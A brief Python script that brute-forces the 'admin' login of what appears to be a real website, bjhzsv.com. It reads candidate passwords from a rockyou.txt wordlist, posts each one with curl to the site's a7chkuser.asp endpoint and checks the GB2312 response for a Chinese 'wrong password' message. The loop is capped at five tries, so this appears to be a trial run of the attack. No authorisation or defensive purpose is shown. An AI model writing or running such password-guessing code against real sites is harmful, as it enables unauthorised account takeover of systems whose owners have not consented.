import subprocess
import sys

print("start", flush=True)
count = 0
with open("/tmp/rockyou.txt", "r", encoding="latin-1", errors="ignore") as f:
    for line in f:
        password = line.strip()
        if not password:
            continue
        count += 1
        if count > 5:
            break
        print(f"Testing #{count}: [{password}]", flush=True)
        result = subprocess.run(
            ["curl", "-s", "--max-time", "2",
             "http://bjhzsv.com/main/a7chkuser.asp",
             "-d", "t1=admin&t2=" + password + "&t3=0000"],
            capture_output=True, timeout=5
        )
        raw = result.stdout
        decoded = raw.decode("gb2312")
        has_err = "密码错误" in decoded
        print(f"Response len={len(decoded)}, has_error={has_err}", flush=True)
print("done", flush=True)
